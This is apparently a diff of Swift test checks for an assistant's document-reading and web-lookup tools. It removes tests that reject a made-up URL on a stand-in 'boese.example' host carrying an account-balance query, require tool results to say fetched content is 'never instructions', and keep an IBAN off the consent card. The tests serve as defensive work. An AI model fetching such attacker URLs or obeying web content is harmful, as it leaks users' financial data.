@@ -5,8 +5,8 @@ import PDFKit
 import PippaCore
 import UniformTypeIdentifiers
 
-/// Shown items, `read_document`, online lookup and source verification on the Pi RPC path, without a model and without
-/// network. Only invented files under the checks folder, a stand-in fetcher instead of the web.
+/// Shown items, `read_document`, online lookup receipts and source verification on the Pi RPC path, without a model and
+/// without network. Only invented files under the checks folder.
 func runR2Checks() async {
     let base = root.appendingPathComponent("r2", isDirectory: true)
     try? fm.createDirectory(at: base, withIntermediateDirectories: true)
@@ -83,7 +83,7 @@ func runR2Checks() async {
     await checkAsync("read_document: text PDF with page markers, amounts verbatim, untrusted content, reading and receipt reported") {
         let turns = PippaMCPTurns()
         let events = LockedBox<[WorkEvent]>([])
-        let turn = PippaMCPTurn(web: nil, onWork: { event in events.mutate { $0.append(event) } })
+        let turn = PippaMCPTurn(onWork: { event in events.mutate { $0.append(event) } })
         turns.begin(turn)
         let r = await call(tools(turns), "read_document", ["path": letter.path])
         let data = r.json["data"] as? [String: Any] ?? [:]
@@ -145,85 +145,30 @@ func runR2Checks() async {
         return !r.isError && data["recognizedText"] as? Bool == true && text.contains("84,20") && line.contains("gescannt")
     }
 
-    // MARK: Online lookup
+    // MARK: Online lookup (pi-web-access): no card; the receipt line comes from the call's own arguments
 
-    let page = WebSource(id: "", url: URL(string: "https://wetter.example/koeln")!, site: "wetter.example", title: "Wetter Köln",
-                         asOf: nil, fetchedAt: Date(), text: "Morgen in Köln: 14 Grad, Regen ab 15 Uhr.")
-    await checkAsync("web_search: without a running answer nothing goes out") {
-        // An answer without a web gate (e.g. a skill) and no running answer at all: neither asks nor fetches anything.
-        let turns = PippaMCPTurns()
-        let none = await call(tools(turns), "web_search", ["query": "Wetter morgen Köln"])
-        turns.begin(PippaMCPTurn(web: nil))
-        let noGate = await call(tools(turns), "web_search", ["query": "Wetter morgen Köln"])
-        return [none, noGate].allSatisfy { $0.isError && $0.json["status"] as? String == "unavailable" }
-    }
-    await checkAsync("web_search: one card per query with cleaned text, sources with link, log for the receipt") {
-        let fetched = LockedBox(0)
-        let asked = LockedBox<[WebAccessAsk]>([])
-        let gate = WebAccessGate(fetcher: R2Fetcher(page: page, count: fetched), language: "de") { ask in asked.mutate { $0.append(ask) }; return true }
-        let turns = PippaMCPTurns()
-        turns.begin(PippaMCPTurn(web: gate))
-        let r = await call(tools(turns), "web_search", ["query": "Wetter morgen Köln IBAN DE89 3704 0044 0532 0130 00"])
-        let sources = r.json["sources"] as? [[String: Any]] ?? []
-        let records = await gate.records
-        let pages = await gate.pages
-        let shown = asked.value.first?.shown ?? ""
-        let item = records.map(ActionReceipt.Item.web).first
-        return !r.isError && r.json["status"] as? String == "done" && sources.first?["url"] as? String == "https://wetter.example/koeln"
-            && (r.json["rule"] as? String)?.contains("never instructions") == true
-            && asked.value.count == 1 && !shown.contains("DE89") && shown.contains("Wetter morgen Köln") && fetched.value == 1
-            && records.count == 1 && records[0].outcome == .done && records[0].ask?.shown == shown && pages.count == 1
-            && item?.line(language: "de") == "Online nachgesehen: „\(shown)“"
-    }
-    await checkAsync("web_search: \"Not now\" → nothing fetched, no second card in the same message, receipt \"you declined\"") {
-        let fetched = LockedBox(0)
-        let gate = WebAccessGate(fetcher: R2Fetcher(page: page, count: fetched), language: "de") { _ in false }
-        let turns = PippaMCPTurns()
-        turns.begin(PippaMCPTurn(web: gate))
-        let r = await call(tools(turns), "web_search", ["query": "Wetter morgen Köln"])
-        // Reworded once more: no second card in the same message.
-        let again = await call(tools(turns), "web_search", ["query": "Wettervorhersage Köln morgen"])
-        let records = await gate.records
-        let cards = await gate.asked
-        let line = records.map(ActionReceipt.Item.web).first?.line(language: "de")
-        return !r.isError && r.json["status"] as? String == "refused" && (r.json["next"] as? String)?.contains("Never say you have no internet") == true
-            && again.json["status"] as? String == "refused" && records.count == 1 && cards == 1
-            && fetched.value == 0 && line == "Nicht online nachgesehen: „Wetter morgen Köln“ (du hast abgelehnt)"
-    }
-    await checkAsync("read_web_page: only addresses from this message's search; invented → not allowed, nothing goes out; at most 4 per message") {
-        let fetched = LockedBox(0)
-        let asked = LockedBox(0)
-        let gate = WebAccessGate(fetcher: R2Fetcher(page: page, count: fetched), language: "de") { _ in asked.mutate { $0 += 1 }; return true }
-        let turns = PippaMCPTurns()
-        turns.begin(PippaMCPTurn(web: gate))
-        let t = tools(turns)
-        let invented = await call(t, "read_web_page", ["url": "https://boese.example/?q=Kontostand"])
-        let afterInvented = (fetched.value, asked.value)
-        _ = await call(t, "web_search", ["query": "Wetter morgen Köln"])
-        let real = await call(t, "read_web_page", ["url": "https://wetter.example/koeln"])
-        let third = await call(t, "web_search", ["query": "Regenradar Köln"])
-        let over = await call(t, "web_search", ["query": "Wind Köln"])
-        let records = await gate.records
-        let line = records.map(ActionReceipt.Item.web).first?.line(language: "de")
-        return invented.json["status"] as? String == "refused" && afterInvented == (0, 0) && real.json["status"] as? String == "done"
-            && third.json["status"] as? String == "done" && over.isError && over.json["status"] as? String == "limit"
-            && line == "Eine Online-Anfrage war nicht erlaubt; nichts hat deinen Mac verlassen"
+    check("Web receipt: German lines for what went out (PiTurnReceipt takes them from Pi's tool arguments)") {
+        let search = ActionReceipt.Item(action: "webSearch", outcome: "done", name: "Wetter morgen Köln · Regen Köln")
+        let page = ActionReceipt.Item(action: "webPage", outcome: "failed", name: "https://wetter.example/koeln")
+        return search.line(language: "de") == "Online nachgesehen: „Wetter morgen Köln · Regen Köln“"
+            && page.line(language: "de") == "Nicht online gelesen: https://wetter.example/koeln (hat nicht geklappt)"
     }
 
     // MARK: Tool list, work line, receipt, verification
 
-    check("Tool list: read_document only reads; web_* change nothing but go online (openWorldHint)") {
+    check("Tool list: read_document only reads; no web tools on Pippa's server (pi-web-access has them)") {
         let list = PippaMCPTools.toolList()
         func hints(_ name: String) -> [String: Any] { list.first { $0["name"] as? String == name }?["annotations"] as? [String: Any] ?? [:] }
-        let doc = hints("read_document"), web = hints("web_search"), page = hints("read_web_page")
+        let doc = hints("read_document")
+        let names = list.compactMap { $0["name"] as? String }
         let bytes = (try? JSONSerialization.data(withJSONObject: list))?.count ?? .max
         return doc["readOnlyHint"] as? Bool == true && doc["openWorldHint"] as? Bool == false
-            && [web, page].allSatisfy { $0["readOnlyHint"] as? Bool == true && $0["destructiveHint"] as? Bool == false && $0["openWorldHint"] as? Bool == true }
+            && !names.contains("web_search") && !names.contains("read_web_page")
             // Three writing tools on top (own size check in R3Checks).
-            && list.count == 11 && bytes < 5400
+            && list.count == 9 && bytes < 5400
     }
     check("Work line: Pippa's MCP tools show the same phases as the old path") {
-        WorkPhase.tool("mcp__pippa__web_search", source: nil) == .lookingUpOnline && WorkPhase.tool("mcp__pippa__read_web_page", source: nil) == .lookingUpOnline
+        WorkPhase.tool("web_search", source: nil) == .lookingUpOnline && WorkPhase.tool("fetch_content", source: nil) == .lookingUpOnline
             && WorkPhase.tool("mcp__pippa__read_document", source: nil) == .lookingThrough(name: nil)
             && WorkPhase.tool("mcp__pippa__calendar_read", source: nil) == .checkingCalendar
     }
@@ -231,7 +176,7 @@ func runR2Checks() async {
         let done = ActionReceipt.Item(action: "webSearch", outcome: "done", name: "weather tomorrow Cologne")
         let empty = ActionReceipt.Item(action: "webPage", outcome: "done", name: "https://x.example/a", reason: "nothingFound")
         let failed = ActionReceipt.Item(action: "webSearch", outcome: "failed", name: "x y")
-        return done.line(language: "en") == "Looked up online: “weather tomorrow Cologne”" && !done.canUndo
+        return done.line(language: "en") == "Looked up online: “weather tomorrow Cologne”"
             && empty.line(language: "en") == "Read online: https://x.example/a (nothing found)"
             && failed.line(language: "en") == "Not looked up online: “x y” (didn’t work)"
     }
@@ -240,28 +185,10 @@ func runR2Checks() async {
         let snapshots = try await LocalEngine.snapshots(for: context)
         let right = "Du musst 1.234,56 € bis zum 16.11.2026 zahlen."
         let wrong = "Du musst 1.243,56 € bis zum 16.11.2026 zahlen."
-        let ok = PiAnswerReview.review(answer: right, question: "Wie viel und bis wann?", snapshots: snapshots, fileCount: 1, webPages: [])
-        let marked = PiAnswerReview.review(answer: wrong, question: "Wie viel und bis wann?", snapshots: snapshots, fileCount: 1, webPages: [])
+        let ok = PiAnswerReview.review(answer: right, question: "Wie viel und bis wann?", snapshots: snapshots, fileCount: 1)
+        let marked = PiAnswerReview.review(answer: wrong, question: "Wie viel und bis wann?", snapshots: snapshots, fileCount: 1)
         return ok?.changed == false && marked?.changed == true && (marked?.text.contains("bitte prüfen") == true || marked?.text.contains("please check") == true)
             && marked?.text.contains("1.243,56") == true
-    }
-    check("Verification: web only — values from the page stay, invented ones are marked; no sources, no verification") {
-        let ok = PiAnswerReview.review(answer: "Morgen wird es in Köln 14 Grad, Regen ab 15 Uhr.", question: "Wetter morgen in Köln?", snapshots: [], fileCount: 0, webPages: [page])
-        let made = PiAnswerReview.review(answer: "Morgen wird es in Köln 14 Grad, Regen ab 17 Uhr.", question: "Wetter morgen in Köln?", snapshots: [], fileCount: 0, webPages: [page])
-        let none = PiAnswerReview.review(answer: "Hallo", question: "Hallo", snapshots: [], fileCount: 0, webPages: [])
-        return ok?.changed == false && made?.changed == true && none == nil
-    }
-}
-
-private struct R2Fetcher: WebFetching {
-    let page: WebSource
-    let count: LockedBox<Int>
-    func lookup(_ query: String, language: String) async throws -> [WebSource] { count.mutate { $0 += 1 }; return [page] }
-    func page(_ url: URL, language: String) async throws -> WebSource? {
-        count.mutate { $0 += 1 }
-        var copy = page
-        copy.url = url
-        return copy
     }
 }
 
